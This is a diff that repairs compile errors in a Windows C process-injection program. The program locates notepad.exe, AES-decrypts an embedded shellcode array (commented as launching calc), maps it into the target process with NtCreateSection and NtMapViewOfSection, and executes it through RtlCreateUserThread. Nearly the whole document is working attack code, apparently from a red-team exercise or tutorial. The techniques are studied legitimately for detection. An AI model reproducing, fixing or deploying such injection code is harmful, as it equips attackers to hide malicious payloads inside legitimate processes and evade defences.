@@ -5,7 +5,7 @@
 # include <string.h>
 # include <tlhelp32.h>
 # include <wincrypt.h>
-#pragma comment (lib, "crypt.lib")
+#pragma comment (lib, "crypt32.lib")
 #pragma comment (lib, "advapi32")
 
 //brings up calc  
@@ -15,6 +15,11 @@ char unsigned payload[] = { 0x53, 0x1f, 0x82, 0x62, 0xa6, 0xb0, 0x2c, 0x41, 0x3e
 unsigned int payload_len = sizeof(payload);
 
 //typedef
+typedef struct _CLIENT_ID {
+	HANDLE UniqueProcess;
+	HANDLE UniqueThread;
+} CLIENT_ID, *PCLIENT_ID;
+
 typedef LPVOID (WINAPI * VirtualAlloc_t)(
 	LPVOID lpAddress,
 	SIZE_T dwSize,
@@ -130,7 +135,7 @@ int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keyl
 int FindTarget(const char *procname) {
     
     HANDLE hProcSnap;
-    PROCESSENTRY pe32;
+    PROCESSENTRY32 pe32;
     int pid = 0;
 
     hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -143,8 +148,8 @@ int FindTarget(const char *procname) {
         return 0;
     }
 
-    while (Process32Next(hProcessSnap, &pe32)){
-        if(LstrcmpiA(procname, pe32.szExeFile) == 0){
+    while (Process32Next(hProcSnap, &pe32)){
+        if(lstrcmpiA(procname, pe32.szExeFile) == 0){
             pid = pe32.th32ProcessID;
             break;
         }
@@ -175,44 +180,44 @@ HANDLE FindThread(int pid){
 }
 
 // set remote process/
-int InjectVIEW(HANDLE hProc, unsigned char * payload, unsigned int payload_len){
+// map section views injection
+int InjectVIEW(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
 
 	HANDLE hSection = NULL;
 	PVOID pLocalView = NULL, pRemoteView = NULL;
 	HANDLE hThread = NULL;
 	CLIENT_ID cid;
 
-	// creat memory section
-	NtCreateSection_t pNtCreateSection = (NtCreateSection_t) GetProcAddress (GetModuleHandle("NTDLL.DLL"), "NTCreateSection");
+	// create memory section
+	NtCreateSection_t pNtCreateSection = (NtCreateSection_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtCreateSection");
 	if (pNtCreateSection == NULL)
 		return -2;
-	
-	pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER) &payload_len, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL );
+	pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER) &payload_len, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
 
-	// create locla section view
-	NTMapViewOfSection_t pNTMapViewOfScetion = (NtMapViewOfsection_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NTMapViewOfSection");
+	// create local section view
+	NtMapViewOfSection_t pNtMapViewOfSection = (NtMapViewOfSection_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtMapViewOfSection");
 	if (pNtMapViewOfSection == NULL)
 		return -2;
-
-	pNTMapViewofSection(hSection, GetCurrentProcess(), &pLocalView, NULL, NULL, NULL, (SIZE_T *) &payload_len, ViewUnmap, NULL, PAGE_READWRITE);
+	pNtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalView, NULL, NULL, NULL, (SIZE_T *) &payload_len, ViewUnmap, NULL, PAGE_READWRITE);
 
 	// throw the payload into the section
 	memcpy(pLocalView, payload, payload_len);
-
+	
 	// create remote section view (target process)
 	pNtMapViewOfSection(hSection, hProc, &pRemoteView, NULL, NULL, NULL, (SIZE_T *) &payload_len, ViewUnmap, NULL, PAGE_EXECUTE_READ);
 
-	// execute 
-	RtlCreateUserThread_t pRtlCreateUserThread = (RtlCreateUserThread_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "RtlCreateUserThread");
+	//printf("wait: pload = %p ; rview = %p ; lview = %p\n", payload, pRemoteView, pLocalView);
+	//getchar();
 
+	// execute the payload
+	RtlCreateUserThread_t pRtlCreateUserThread = (RtlCreateUserThread_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "RtlCreateUserThread");
 	if (pRtlCreateUserThread == NULL)
 		return -2;
-	
 	pRtlCreateUserThread(hProc, NULL, FALSE, 0, 0, 0, pRemoteView, 0, &hThread, &cid);
 	if (hThread != NULL) {
-		WaitForSingleObject(hThread, 500);
-		CloseHandle(hThread);
-		return 0;
+			WaitForSingleObject(hThread, 500);
+			CloseHandle(hThread);
+			return 0;
 	}
 	return -1;
 }
@@ -225,7 +230,7 @@ int main(void) {
 	pid = FindTarget("notepad.exe");
 
 	if (pid) {
-		printf(/"Notepad.exe PID =%d\n", pid);
+		printf("Notepad.exe PID =%d\n", pid);
 
 		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
 						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
@@ -234,9 +239,11 @@ int main(void) {
 		if (hProc != NULL) {
 			// Decrypt and Inject payload
 			AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));
-			InjectView(hProc, payload, payload_len);
+			InjectVIEW(hProc, payload, payload_len);
 			CloseHandle(hProc);
 		}
+	} else {
+		printf("start the process first");
 	}
 
 	return 0;
